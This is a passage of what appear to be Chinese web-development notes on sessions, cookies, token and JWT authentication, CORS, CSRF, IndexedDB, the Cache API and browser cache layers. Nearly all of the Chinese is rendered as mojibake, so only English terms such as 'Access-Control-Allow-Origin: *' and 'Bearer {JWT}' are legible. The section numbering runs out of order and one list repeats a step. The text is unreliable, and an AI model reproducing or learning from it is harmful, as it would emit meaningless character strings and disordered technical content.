ä¸ºé˜²æ­¢å†…å­˜æº¢å‡ºï¼ŒæœåŠ¡å™¨ä¼šæŠŠé•¿æ—¶é—´å†…æ²¡æœ‰æ´»è·ƒçš„Sessionä»Žå†…å­˜åˆ é™¤ã€‚ è¿™ä¸ªæ—¶é—´å°±æ˜¯Sessionçš„è¶…æ—¶æ—¶é—´ã€‚å¦‚æžœè¶…è¿‡äº†è¶…æ—¶æ—¶é—´æ²¡è®¿é—®è¿‡æœåŠ¡å™¨ï¼ŒSessionå°±è‡ªåŠ¨å¤±æ•ˆäº†ã€‚ Sessionçš„è¶…æ—¶æ—¶é—´ä¸ºmaxInactiveIntervalå±žæ€§ï¼Œ å¯ä»¥é€šè¿‡å¯¹åº”çš„getMaxInactiveInterval()èŽ·å–ï¼Œé€šè¿‡setMaxInactiveInterval(longinterval)ä¿®æ”¹ã€‚ Sessionçš„è¶…æ—¶æ—¶é—´ä¹Ÿå¯ä»¥åœ¨web.xmlä¸­ä¿®æ”¹ã€‚ å¦å¤–ï¼Œé€šè¿‡è°ƒç”¨Sessionçš„invalidate()æ–¹æ³•å¯ä»¥ä½¿Sessionå¤±æ•ˆã€‚ Cookieå’ŒSessionçš„çš„åŒºåˆ« HTTPåè®®æ˜¯æ— çŠ¶æ€çš„åè®®ï¼ŒæœåŠ¡ç«¯éœ€è¦è®°å½•ç”¨æˆ·çš„çŠ¶æ€ï¼Œå°±éœ€è¦ç”¨æŸç§æœºåˆ¶æ¥è¯†åˆ«å…·ä½“çš„ç”¨æˆ·ï¼Œè¿™ä¸ªæœºåˆ¶å°±æ˜¯Sessionã€‚ Sessionå…¸åž‹çš„åº”ç”¨åœºæ™¯å°±æ˜¯è´­ç‰©è½¦ï¼Œå½“ç‚¹å‡»ä¸‹å•æŒ‰é’®æ—¶ï¼Œç”±äºŽHTTPåè®®æ— çŠ¶æ€ï¼Œæ‰€ä»¥å¹¶ä¸çŸ¥é“æ˜¯å“ªä¸ªç”¨æˆ·æ“ä½œçš„ï¼Œ æ‰€ä»¥æœåŠ¡ç«¯è¦ä¸ºç‰¹å®šçš„ç”¨æˆ·åˆ›å»ºäº†ç‰¹å®šçš„Sessionï¼Œç”¨äºŽæ ‡è¯†è¿™ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”è·Ÿè¸ªç”¨æˆ·ï¼Œè¿™æ ·æ‰çŸ¥é“è´­ç‰©è½¦é‡Œé¢çš„å•†å“æƒ…å†µã€‚ è¿™ä¸ªSessionæ˜¯ä¿å­˜åœ¨æœåŠ¡ç«¯çš„ï¼Œæœ‰ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ã€‚åœ¨æœåŠ¡ç«¯ä¿å­˜Sessionçš„æ–¹æ³•å¾ˆå¤šï¼Œå†…å­˜ã€æ•°æ®åº“ã€æ–‡ä»¶éƒ½æœ‰ã€‚ é›†ç¾¤çš„æ—¶å€™ä¹Ÿè¦è€ƒè™‘Sessionçš„è½¬ç§»ï¼Œåœ¨å¤§åž‹çš„ç½‘ç«™ï¼Œä¸€èˆ¬ä¼šæœ‰ä¸“é—¨çš„SessionæœåŠ¡å™¨é›†ç¾¤ï¼Œ ç”¨æ¥ä¿å­˜ç”¨æˆ·ä¼šè¯ï¼Œè¿™ä¸ªæ—¶å€™ Session ä¿¡æ¯éƒ½æ˜¯æ”¾åœ¨å†…å­˜çš„ï¼Œæ­¤å¤–ï¼Œä¸€äº›ç¼“å­˜æœåŠ¡æ¯”å¦‚Memcachedä¹‹ç±»çš„æ¥æ”¾ Sessionã€‚ æœåŠ¡ç«¯ä½¿ç”¨Cookieæ¥è¯†åˆ«ç‰¹å®šçš„å®¢æˆ·ã€‚æ¯æ¬¡HTTPè¯·æ±‚çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯éƒ½ä¼šå‘é€ç›¸åº”çš„Cookieä¿¡æ¯åˆ°æœåŠ¡ç«¯ã€‚ å®žé™…ä¸Šå¤§å¤šæ•°çš„åº”ç”¨éƒ½æ˜¯ç”¨ Cookie æ¥å®žçŽ°Sessionè·Ÿè¸ªçš„ï¼Œ ç¬¬ä¸€æ¬¡åˆ›å»ºSessionçš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯ä¼šåœ¨HTTPåè®®ä¸­å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œéœ€è¦åœ¨ Cookie é‡Œé¢è®°å½•ä¸€ä¸ªsession idï¼Œ ä»¥åŽæ¯æ¬¡è¯·æ±‚æŠŠè¿™ä¸ª session idå‘é€åˆ°æœåŠ¡å™¨ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨å¯¹åº”çš„Seesionäº†ã€‚ å¦‚æžœå®¢æˆ·ç«¯çš„æµè§ˆå™¨ç¦ç”¨äº† Cookie æ€Žä¹ˆåŠžï¼Ÿ ä¸€èˆ¬è¿™ç§æƒ…å†µä¸‹ï¼Œä¼šä½¿ç”¨ä¸€ç§å«åšURLé‡å†™çš„æŠ€æœ¯æ¥è¿›è¡Œä¼šè¯è·Ÿè¸ªï¼Œ å³æ¯æ¬¡HTTPäº¤äº’ï¼ŒURLåŽé¢éƒ½ä¼šè¢«é™„åŠ ä¸Šä¸€ä¸ªè¯¸å¦‚ sid=xxxxx è¿™æ ·çš„å‚æ•°ï¼ŒæœåŠ¡ç«¯æ®æ­¤æ¥è¯†åˆ«ç”¨æˆ·ã€‚ Cookieå…¶å®žè¿˜å¯ä»¥ç”¨åœ¨ä¸€äº›æ–¹ä¾¿ç”¨æˆ·çš„åœºæ™¯ä¸‹ï¼Œ è®¾æƒ³ä½ æŸæ¬¡ç™»é™†è¿‡ä¸€ä¸ªç½‘ç«™ï¼Œä¸‹æ¬¡ç™»å½•çš„æ—¶å€™ä¸æƒ³å†æ¬¡è¾“å…¥è´¦å·äº†ï¼Œæ€Žä¹ˆåŠžï¼Ÿ è¿™ä¸ªä¿¡æ¯å¯ä»¥å†™åˆ°Cookieé‡Œé¢ï¼Œè®¿é—®ç½‘ç«™çš„æ—¶å€™ï¼Œ ç½‘ç«™é¡µé¢çš„è„šæœ¬å¯ä»¥è¯»å–è¿™ä¸ªä¿¡æ¯ï¼Œå°±è‡ªåŠ¨å¸®ä½ æŠŠç”¨æˆ·åç»™å¡«äº†ï¼Œ èƒ½å¤Ÿæ–¹ä¾¿ä¸€ä¸‹ç”¨æˆ·ã€‚è¿™ä¹Ÿæ˜¯Cookieåç§°çš„ç”±æ¥ï¼Œç»™ç”¨æˆ·çš„ä¸€ç‚¹ç”œå¤´ã€‚ äº”ã€Tokenåœ¨Webé¢†åŸŸåŸºäºŽTokençš„èº«ä»½éªŒè¯éšå¤„å¯è§ã€‚åœ¨å¤§å¤šæ•°ä½¿ç”¨Web APIçš„äº’è”ç½‘å…¬å¸ä¸­ï¼Œtokens æ˜¯å¤šç”¨æˆ·ä¸‹å¤„ç†è®¤è¯çš„æœ€ä½³æ–¹å¼ã€‚ ä»¥ä¸‹å‡ ç‚¹ç‰¹æ€§ä¼šè®©ä½ åœ¨ç¨‹åºä¸­ä½¿ç”¨åŸºäºŽTokençš„èº«ä»½éªŒè¯ æ— çŠ¶æ€ã€å¯æ‰©å±• æ”¯æŒç§»åŠ¨è®¾å¤‡ è·¨ç¨‹åºè°ƒç”¨ å®‰å…¨ é‚£äº›ä½¿ç”¨åŸºäºŽTokençš„èº«ä»½éªŒè¯çš„å¤§ä½¬ä»¬ å¤§éƒ¨åˆ†ä½ è§åˆ°è¿‡çš„APIå’ŒWebåº”ç”¨éƒ½ä½¿ç”¨tokensã€‚ä¾‹å¦‚Facebook, Twitter, Google+, GitHubç­‰ã€‚ ç”¨æˆ·è¾“å…¥ç™»é™†å‡­æ®ï¼› åŸºäºŽæœåŠ¡å™¨çš„éªŒè¯æˆ‘ä»¬éƒ½æ˜¯çŸ¥é“HTTPåè®®æ˜¯æ— çŠ¶æ€çš„ï¼Œè¿™ç§æ— çŠ¶æ€æ„å‘³ç€ç¨‹åºéœ€è¦éªŒè¯æ¯ä¸€æ¬¡è¯·æ±‚ï¼Œä»Žè€Œè¾¨åˆ«å®¢æˆ·ç«¯çš„èº«ä»½ã€‚ åœ¨è¿™ä¹‹å‰ï¼Œç¨‹åºéƒ½æ˜¯é€šè¿‡åœ¨æœåŠ¡ç«¯å­˜å‚¨çš„ç™»å½•ä¿¡æ¯æ¥è¾¨åˆ«è¯·æ±‚çš„ã€‚è¿™ç§æ–¹å¼ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡å­˜å‚¨Sessionæ¥å®Œæˆã€‚ éšç€Webï¼Œåº”ç”¨ç¨‹åºï¼Œå·²ç»ç§»åŠ¨ç«¯çš„å…´èµ·ï¼Œè¿™ç§éªŒè¯çš„æ–¹å¼é€æ¸æš´éœ²å‡ºäº†é—®é¢˜ã€‚å°¤å…¶æ˜¯åœ¨å¯æ‰©å±•æ€§æ–¹é¢ã€‚ åŸºäºŽæœåŠ¡å™¨éªŒè¯æ–¹å¼æš´éœ²çš„ä¸€äº›é—®é¢˜ Seesionï¼šæ¯æ¬¡è®¤è¯ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨éœ€è¦åŽ»åˆ›å»ºä¸€ä¸ªè®°å½•æ¥å­˜å‚¨ä¿¡æ¯ã€‚å½“è¶Šæ¥è¶Šå¤šçš„ç”¨æˆ·å‘è¯·æ±‚æ—¶ï¼Œå†…å­˜çš„å¼€é”€ä¹Ÿä¼šä¸æ–­å¢žåŠ ã€‚ å¯æ‰©å±•æ€§ï¼šåœ¨æœåŠ¡ç«¯çš„å†…å­˜ä¸­ä½¿ç”¨Seesionå­˜å‚¨ç™»å½•ä¿¡æ¯ï¼Œä¼´éšè€Œæ¥çš„æ˜¯å¯æ‰©å±•æ€§é—®é¢˜ã€‚ CORS(è·¨åŸŸèµ„æºå…±äº«)ï¼šå½“æˆ‘ä»¬éœ€è¦è®©æ•°æ®è·¨å¤šå°ç§»åŠ¨è®¾å¤‡ä¸Šä½¿ç”¨æ—¶ï¼Œè·¨åŸŸèµ„æºçš„å…±äº«ä¼šæ˜¯ä¸€ä¸ªè®©äººå¤´ç–¼çš„é—®é¢˜ã€‚åœ¨ä½¿ç”¨AjaxæŠ“å–å¦ä¸€ä¸ªåŸŸçš„èµ„æºï¼Œå°±å¯ä»¥ä¼šå‡ºçŽ°ç¦æ­¢è¯·æ±‚çš„æƒ…å†µã€‚ CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )ï¼šç”¨æˆ·åœ¨è®¿é—®é“¶è¡Œç½‘ç«™æ—¶ï¼Œä»–ä»¬å¾ˆå®¹æ˜“å—åˆ°è·¨ç«™è¯·æ±‚ä¼ªé€ çš„æ”»å‡»ï¼Œå¹¶ä¸”èƒ½å¤Ÿè¢«åˆ©ç”¨å…¶è®¿é—®å…¶ä»–çš„ç½‘ç«™ã€‚ åœ¨è¿™äº›é—®é¢˜ä¸­ï¼Œå¯æ‰©å±•è¡Œæ˜¯æœ€çªå‡ºçš„ã€‚å› æ­¤æˆ‘ä»¬æœ‰å¿…è¦åŽ»å¯»æ±‚ä¸€ç§æ›´æœ‰è¡Œä¹‹æœ‰æ•ˆçš„æ–¹æ³•ã€‚ åŸºäºŽTokençš„éªŒè¯åŽŸç†åŸºäºŽTokençš„èº«ä»½éªŒè¯æ˜¯æ— çŠ¶æ€çš„ï¼Œæˆ‘ä»¬ä¸å°†ç”¨æˆ·ä¿¡æ¯å­˜åœ¨æœåŠ¡å™¨æˆ–Sessionä¸­ã€‚ è¿™ç§æ¦‚å¿µè§£å†³äº†åœ¨æœåŠ¡ç«¯å­˜å‚¨ä¿¡æ¯æ—¶çš„è®¸å¤šé—®é¢˜ NoSessionæ„å‘³ç€ä½ çš„ç¨‹åºå¯ä»¥æ ¹æ®éœ€è¦åŽ»å¢žå‡æœºå™¨ï¼Œè€Œä¸ç”¨åŽ»æ‹…å¿ƒç”¨æˆ·æ˜¯å¦ç™»å½•ã€‚ åŸºäºŽTokençš„èº«ä»½éªŒè¯çš„è¿‡ç¨‹å¦‚ä¸‹: ç”¨æˆ·é€šè¿‡ç”¨æˆ·åå’Œå¯†ç å‘é€è¯·æ±‚ã€‚ ç¨‹åºéªŒè¯ã€‚ ç¨‹åºè¿”å›žä¸€ä¸ªç­¾åçš„token ç»™å®¢æˆ·ç«¯ã€‚ å®¢æˆ·ç«¯å‚¨å­˜token,å¹¶ä¸”æ¯æ¬¡ç”¨äºŽæ¯æ¬¡å‘é€è¯·æ±‚ã€‚ æœåŠ¡ç«¯éªŒè¯tokenå¹¶è¿”å›žæ•°æ®ã€‚ æ¯ä¸€æ¬¡è¯·æ±‚éƒ½éœ€è¦tokenã€‚tokenåº”è¯¥åœ¨HTTPçš„å¤´éƒ¨å‘é€ä»Žè€Œä¿è¯äº†Httpè¯·æ±‚æ— çŠ¶æ€ã€‚æˆ‘ä»¬åŒæ ·é€šè¿‡è®¾ç½®æœåŠ¡å™¨å±žæ€§Access-Control-Allow-Origin:* ï¼Œè®©æœåŠ¡å™¨èƒ½æŽ¥å—åˆ°æ¥è‡ªæ‰€æœ‰åŸŸçš„è¯·æ±‚ã€‚ éœ€è¦ä¸»è¦çš„æ˜¯ï¼Œåœ¨ACAOå¤´éƒ¨æ ‡æ˜Ž(designating)*æ—¶ï¼Œä¸å¾—å¸¦æœ‰åƒHTTPè®¤è¯ï¼Œå®¢æˆ·ç«¯SSLè¯ä¹¦å’Œcookiesçš„è¯ä¹¦ã€‚ å®žçŽ°æ€è·¯ï¼š ç”¨æˆ·ç™»å½•æ ¡éªŒï¼Œæ ¡éªŒæˆåŠŸåŽå°±è¿”å›žTokenç»™å®¢æˆ·ç«¯ã€‚ å®¢æˆ·ç«¯æ”¶åˆ°æ•°æ®åŽä¿å­˜åœ¨å®¢æˆ·ç«¯ å®¢æˆ·ç«¯æ¯æ¬¡è®¿é—®APIæ˜¯æºå¸¦Tokenåˆ°æœåŠ¡å™¨ç«¯ã€‚ æœåŠ¡å™¨ç«¯é‡‡ç”¨filterè¿‡æ»¤å™¨æ ¡éªŒã€‚æ ¡éªŒæˆåŠŸåˆ™è¿”å›žè¯·æ±‚æ•°æ®ï¼Œæ ¡éªŒå¤±è´¥åˆ™è¿”å›žé”™è¯¯ç  å½“æˆ‘ä»¬åœ¨ç¨‹åºä¸­è®¤è¯äº†ä¿¡æ¯å¹¶å–å¾—tokenä¹‹åŽï¼Œæˆ‘ä»¬ä¾¿èƒ½é€šè¿‡è¿™ä¸ªTokenåšè®¸å¤šçš„äº‹æƒ…ã€‚ æˆ‘ä»¬ç”šè‡³èƒ½åŸºäºŽåˆ›å»ºä¸€ä¸ªåŸºäºŽæƒé™çš„tokenä¼ ç»™ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºï¼Œè¿™äº›ç¬¬ä¸‰æ–¹ç¨‹åºèƒ½å¤ŸèŽ·å–åˆ°æˆ‘ä»¬çš„æ•°æ®ï¼ˆå½“ç„¶åªæœ‰åœ¨æˆ‘ä»¬å…è®¸çš„ç‰¹å®šçš„tokenï¼‰ Tokensçš„ä¼˜åŠ¿æ— çŠ¶æ€ã€å¯æ‰©å±• åœ¨å®¢æˆ·ç«¯å­˜å‚¨çš„Tokensæ˜¯æ— çŠ¶æ€çš„ï¼Œå¹¶ä¸”èƒ½å¤Ÿè¢«æ‰©å±•ã€‚åŸºäºŽè¿™ç§æ— çŠ¶æ€å’Œä¸å­˜å‚¨Sessionä¿¡æ¯ï¼Œè´Ÿè½½è´Ÿè½½å‡è¡¡å™¨èƒ½å¤Ÿå°†ç”¨æˆ·ä¿¡æ¯ä»Žä¸€ä¸ªæœåŠ¡ä¼ åˆ°å…¶ä»–æœåŠ¡å™¨ä¸Šã€‚ å¦‚æžœæˆ‘ä»¬å°†å·²éªŒè¯çš„ç”¨æˆ·çš„ä¿¡æ¯ä¿å­˜åœ¨Sessionä¸­ï¼Œåˆ™æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦ç”¨æˆ·å‘å·²éªŒè¯çš„æœåŠ¡å™¨å‘é€éªŒè¯ä¿¡æ¯(ç§°ä¸ºSessionäº²å’Œæ€§)ã€‚ç”¨æˆ·é‡å¤§æ—¶ï¼Œå¯èƒ½ä¼šé€ æˆä¸€äº›æ‹¥å µã€‚ ä½†æ˜¯ä¸è¦ç€æ€¥ã€‚ä½¿ç”¨tokensä¹‹åŽè¿™äº›é—®é¢˜éƒ½è¿Žåˆƒè€Œè§£ï¼Œå› ä¸ºtokensè‡ªå·±holdä½äº†ç”¨æˆ·çš„éªŒè¯ä¿¡æ¯ã€‚ å®‰å…¨æ€§ è¯·æ±‚ä¸­å‘é€tokenè€Œä¸å†æ˜¯å‘é€cookieèƒ½å¤Ÿé˜²æ­¢CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )ã€‚å³ä½¿åœ¨å®¢æˆ·ç«¯ä½¿ç”¨cookieå­˜å‚¨tokenï¼Œcookieä¹Ÿä»…ä»…æ˜¯ä¸€ä¸ªå­˜å‚¨æœºåˆ¶è€Œä¸æ˜¯ç”¨äºŽè®¤è¯ã€‚ä¸å°†ä¿¡æ¯å­˜å‚¨åœ¨Sessionä¸­ï¼Œè®©æˆ‘ä»¬å°‘äº†å¯¹sessionæ“ä½œã€‚ tokenæ˜¯æœ‰æ—¶æ•ˆçš„ï¼Œä¸€æ®µæ—¶é—´ä¹‹åŽç”¨æˆ·éœ€è¦é‡æ–°éªŒè¯ã€‚æˆ‘ä»¬ä¹Ÿä¸ä¸€å®šéœ€è¦ç­‰åˆ°tokenè‡ªåŠ¨å¤±æ•ˆï¼Œtokenæœ‰æ’¤å›žçš„æ“ä½œï¼Œé€šè¿‡token revocataionå¯ä»¥ä½¿ä¸€ä¸ªç‰¹å®šçš„tokenæˆ–æ˜¯ä¸€ç»„æœ‰ç›¸åŒè®¤è¯çš„tokenæ— æ•ˆã€‚ å¯æ‰©å±•æ€§ Tokensèƒ½å¤Ÿåˆ›å»ºä¸Žå…¶å®ƒç¨‹åºå…±äº«æƒé™çš„ç¨‹åºã€‚ä¾‹å¦‚ï¼Œèƒ½å°†ä¸€ä¸ªéšä¾¿çš„ç¤¾äº¤å¸å·å’Œè‡ªå·±çš„å¤§å·(Fackbookæˆ–æ˜¯Twitter)è”ç³»èµ·æ¥ã€‚å½“é€šè¿‡æœåŠ¡ç™»å½•Twitter(æˆ‘ä»¬å°†è¿™ä¸ªè¿‡ç¨‹Buffer)æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™äº›Bufferé™„åˆ°Twitterçš„æ•°æ®æµä¸Š(we are allowing Buffer to post to our Twitter stream)ã€‚ ä½¿ç”¨tokensæ—¶ï¼Œå¯ä»¥æä¾›å¯é€‰çš„æƒé™ç»™ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºã€‚å½“ç”¨æˆ·æƒ³è®©å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºè®¿é—®å®ƒä»¬çš„æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å»ºç«‹è‡ªå·±çš„APIï¼Œå¾—å‡ºç‰¹æ®Šæƒé™çš„tokensã€‚ å¤šå¹³å°è·¨åŸŸ æˆ‘ä»¬æå‰å…ˆæ¥è°ˆè®ºä¸€ä¸‹CORS(è·¨åŸŸèµ„æºå…±äº«)ï¼Œå¯¹åº”ç”¨ç¨‹åºå’ŒæœåŠ¡è¿›è¡Œæ‰©å±•çš„æ—¶å€™ï¼Œéœ€è¦ä»‹å…¥å„ç§å„ç§çš„è®¾å¤‡å’Œåº”ç”¨ç¨‹åºã€‚ Having our API just serve data, we can also make the design choice to serve assets from a CDN. This eliminates the issues that CORS brings up after we set a quick header configuration for our application. åªè¦ç”¨æˆ·æœ‰ä¸€ä¸ªé€šè¿‡äº†éªŒè¯çš„tokenï¼Œæ•°æ®å’Œèµ„æºå°±èƒ½å¤Ÿåœ¨ä»»ä½•åŸŸä¸Šè¢«è¯·æ±‚åˆ°ã€‚ 1Access-Control-Allow-Origin: * åŸºäºŽæ ‡å‡†åˆ›å»ºtokençš„æ—¶å€™ï¼Œä½ å¯ä»¥è®¾å®šä¸€äº›é€‰é¡¹ã€‚æˆ‘ä»¬åœ¨åŽç»­çš„æ–‡ç« ä¸­ä¼šè¿›è¡Œæ›´åŠ è¯¦å°½çš„æè¿°ï¼Œä½†æ˜¯æ ‡å‡†çš„ç”¨æ³•ä¼šåœ¨JSON Web Tokensä½“çŽ°ã€‚ æœ€è¿‘çš„ç¨‹åºå’Œæ–‡æ¡£æ˜¯ä¾›ç»™JSON Web Tokensçš„ã€‚å®ƒæ”¯æŒä¼—å¤šçš„è¯­è¨€ã€‚è¿™æ„å‘³åœ¨æœªæ¥çš„ä½¿ç”¨ä¸­ä½ å¯ä»¥çœŸæ­£çš„è½¬æ¢ä½ çš„è®¤è¯æœºåˆ¶ã€‚ å¯¹æ¯”CookieCookieséªŒè¯æ˜¯æœ‰çŠ¶æ€ï¼ˆstatefulï¼‰çš„ã€‚è¿™æ„å‘³ç€ï¼Œæƒé™ä¿¡æ¯ï¼ˆæ¯”å¦‚session IDï¼‰å¿…é¡»åŒæ—¶åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç»´æŠ¤ã€‚æœåŠ¡ç«¯éœ€è¦æ ¹æ®session cookiesä¿¡æ¯åŽ»æ•°æ®åº“æŸ¥è¯¢ç”¨æˆ·ç›¸å…³ä¿¡æ¯ï¼›å®¢æˆ·ç«¯æ¯æ¬¡å‘èµ·è¯·æ±‚æ—¶éƒ½å¿…é¡»å¸¦ä¸ŠCookiesä¿¡æ¯ä½œä¸ºèº«ä»½éªŒè¯ã€‚ ç‰¹å¾ï¼š 1.ä¸éœ€è¦å‰ç«¯å­˜å‚¨Cookiesç”±åŽå°è®¾ç½®ï¼ˆresponse headeré‡Œçš„Set-Cookieï¼‰ï¼Œæµè§ˆå™¨ä¼šåœ¨åŽç»­çš„è¯·æ±‚ä¸­è‡ªåŠ¨åŠ ä¸ŠCookiesä¿¡æ¯ã€‚æœ‰CSRF(è·¨ç«™ç‚¹ä¼ªé€ è¯·æ±‚)é£Žé™© 2.Cookiesæ˜¯ä¸æ”¯æŒè·¨åŸŸè®¿é—®çš„ï¼Œä¸€èˆ¬åªèƒ½åœ¨æŸä¸ªåŸŸååŠå…¶å­åŸŸåä¸‹è¢«è®¿é—®ã€‚ä½†æ˜¯ï¼Œç”±äºŽCookieså¯ä»¥é€šè¿‡JSä»£ç èŽ·å–ï¼ˆdocument.cookiesï¼‰ï¼Œç”±æ­¤ï¼Œå¯èƒ½ä¼šå¼•å‘å®‰å…¨é—®é¢˜ï¼Œæ¯”å¦‚è‘—åçš„CSRFæ”»å‡»ï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ã€‚ 3.ç§»åŠ¨ç«¯ç”¨åœ¨ä½¿ç”¨cookieæ—¶æœ‰å„ç§ä¸ä¾¿åˆ©å’Œå±€é™ 4.ç§»åŠ¨ç«¯å¹³å°å’ŒCookiesé…åˆå¹¶ä¸æ˜¯å¤ªå¥½ï¼Œå¯èƒ½ä¼šåœ¨Cookiesä½¿ç”¨ä¸Šæœ‰å±€é™æ€§ã€‚ 5.Cookieså¯ä»¥åœ¨åŒä¸€åŸŸåä¸‹æˆ–è€…åŒä¸€ä¸»åŸŸä¸åŒå­åŸŸä¸‹å…±äº«ï¼Œä¸€æ—¦è·¨ä¸»åŸŸï¼Œå°±æ— æ³•å…±äº« å¦‚æžœé‡åˆ°è·¨åŸŸå…±äº«èº«ä»½ä¿¡æ¯çš„æƒ…å†µï¼Œå°±å¿…é¡»é æœåŠ¡å™¨ååŠ©ï¼ˆä¾‹å¦‚å•ç‚¹ç™»å½•ï¼šä¸€ä¸ªèº«ä»½ï¼Œéœ€è¦ç™»å½•å¤šä¸ªä¸»åŸŸï¼‰ èº«ä»½éªŒè¯1.ç”¨æˆ·è¾“å…¥ç™»é™†å‡­æ®ï¼› 2.æœåŠ¡å™¨éªŒè¯å‡­æ®æ˜¯å¦æ­£ç¡®ï¼Œå¹¶åˆ›å»ºä¼šè¯ï¼Œç„¶åŽæŠŠä¼šè¯æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼› 3.å…·æœ‰ä¼šè¯idçš„cookieè¢«æ”¾ç½®åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­ï¼› 4.æœåŠ¡å™¨éªŒè¯å‡­æ®æ˜¯å¦æ­£ç¡®ï¼Œå¹¶åˆ›å»ºä¼šè¯ï¼› 5.åœ¨åŽç»­è¯·æ±‚ä¸­ï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ®æ•°æ®åº“éªŒè¯ä¼šè¯idï¼Œå¦‚æžœéªŒè¯é€šè¿‡ï¼Œåˆ™ç»§ç»­å¤„ç†ï¼› 6.ä¸€æ—¦ç”¨æˆ·ç™»å‡ºï¼ŒæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯åŒæ—¶é”€æ¯è¯¥ä¼šè¯åœ¨åŽç»­è¯·æ±‚ä¸­ï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ®æ•°æ®åº“éªŒè¯ä¼šè¯idï¼Œå¦‚æžœéªŒè¯é€šè¿‡ï¼Œåˆ™ç»§ç»­å¤„ç†ï¼› TokenTokenæ˜¯æ— çŠ¶æ€çš„ï¼ˆstatelessï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒæœåŠ¡ç«¯ä¸éœ€è¦åœ¨æ•°æ®åº“ä¸­å­˜å‚¨å’ŒTokenç›¸å…³çš„å­—æ®µï¼ŒTokenæœ¬èº«å°±å·²ç»åŒ…å«äº†ç”¨æˆ·çš„æ‰€æœ‰ä¿¡æ¯ å®¢æˆ·ç«¯ä¸€èˆ¬åœ¨request headeré‡Œé¢åˆ©ç”¨Authorizationå¤´ä¼ é€’Tokenå€¼ï¼Œæ ¼å¼ä¸ºBearer {JWT}ï¼ˆè¯¥æ ¼å¼å¹¶ä¸æ˜¯ç»å¯¹çš„ï¼Œè¦æ ¹æ®æœåŠ¡ç«¯å…·ä½“æƒ…å†µæ¥è®¾ç½®ï¼‰ã€‚ ç‰¹å¾ï¼š 1.Tokenå€¼åŒæ ·éœ€è¦æœåŠ¡ç«¯æä¾›ï¼ˆé€šè¿‡APIè¿”å›žï¼‰å’ŒCookiesä¸åŒï¼Œè¿”å›žå€¼ä¸éœ€è¦æŒ‚è½½åœ¨Set-Cookieä¸Šï¼Œè€Œæ˜¯åˆ©ç”¨å…¶å®ƒresponse headeræˆ–è€…response bodyè¿”å›žTokenå€¼ï¼› 2.éœ€è¦å®¢æˆ·ç«¯å­˜å‚¨å’ŒCookiesä¸åŒï¼Œæµè§ˆå™¨æ— æ³•è‡ªåŠ¨åœ¨ä¸‹ä¸€æ¬¡è¯·æ±‚ä¸­è‡ªåŠ¨æŒ‚è½½èº«ä»½ä¿¡æ¯ã€‚å®¢æˆ·ç«¯å¿…é¡»è‡ªè¡Œå­˜å‚¨Tokenå€¼ï¼ˆå»ºè®®ç”¨localstorageï¼‰ï¼Œç„¶åŽåœ¨åŽç»­è¯·æ±‚ä¸­é€šè¿‡è®¾ç½®request headeræ¥ä¼ é€’Tokenä¿¡æ¯ï¼› 3.æ— CSRFé£Žé™©é€‚åˆç§»åŠ¨ç«¯èº«ä»½è®¤è¯ 4.Tokenæ”¯æŒå„ç±»è·¨åŸŸ èº«ä»½éªŒè¯ 1.æœåŠ¡å™¨éªŒè¯å‡­æ®æ˜¯å¦æ­£ç¡®ï¼Œç„¶åŽè¿”å›žä¸€ä¸ªç»è¿‡ç­¾åçš„tokenï¼› 2.å®¢æˆ·ç«¯è´Ÿè´£å­˜å‚¨tokenï¼Œå¯ä»¥å­˜åœ¨localstorageï¼Œæˆ–è€…cookieä¸­ 3.å¯¹æœåŠ¡å™¨çš„è¯·æ±‚å¸¦ä¸Šè¿™ä¸ªtokenï¼› 4.æœåŠ¡å™¨å¯¹JWTè¿›è¡Œè§£ç ï¼Œå¦‚æžœtokenæœ‰æ•ˆï¼Œåˆ™å¤„ç†è¯¥è¯·æ±‚ï¼› 5.ä¸€æ—¦ç”¨æˆ·ç™»å‡ºï¼Œå®¢æˆ·ç«¯é”€æ¯tokenã€‚ å››ã€IndexDBæµè§ˆå™¨å†…ç½®æ•°æ®åº“ç³»ç»Ÿï¼Œç”¨äºŽå‚¨å­˜å¤§é‡ç»“æž„åŒ–æ•°æ® äº”ã€Cache APIæœ€åˆä¸º service workers åˆ›å»ºï¼Œç”¨äºŽç¼“å­˜ç½‘ç»œè¯·æ±‚ï¼ŒAPIå…¬å¼€äº†window.caches,å…è®¸ä¿å­˜å¯æ°¸è¿œä»¥åŽè®¿é—®çš„Requestså’ŒResponseså¯¹ ç¼“å­˜ç¼“å­˜ä½ç½®ä»Žç¼“å­˜ä½ç½®ä¸Šæ¥è¯´åˆ†ä¸ºå››ç§ï¼Œå¹¶ä¸”å„è‡ªæœ‰ä¼˜å…ˆçº§ï¼Œå½“ä¾æ¬¡æŸ¥æ‰¾ç¼“å­˜ä¸”éƒ½æ²¡æœ‰å‘½ä¸­çš„æ—¶å€™ï¼Œæ‰ä¼šåŽ»è¯·æ±‚ç½‘ç»œã€‚ Service Worker Memory Cache Disk Cache Push Cache 1. Service WorkerService Worker æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨èƒŒåŽçš„ç‹¬ç«‹çº¿ç¨‹ï¼Œä¸€èˆ¬å¯ä»¥ç”¨æ¥å®žçŽ°ç¼“å­˜åŠŸèƒ½ã€‚ä½¿ç”¨ Service 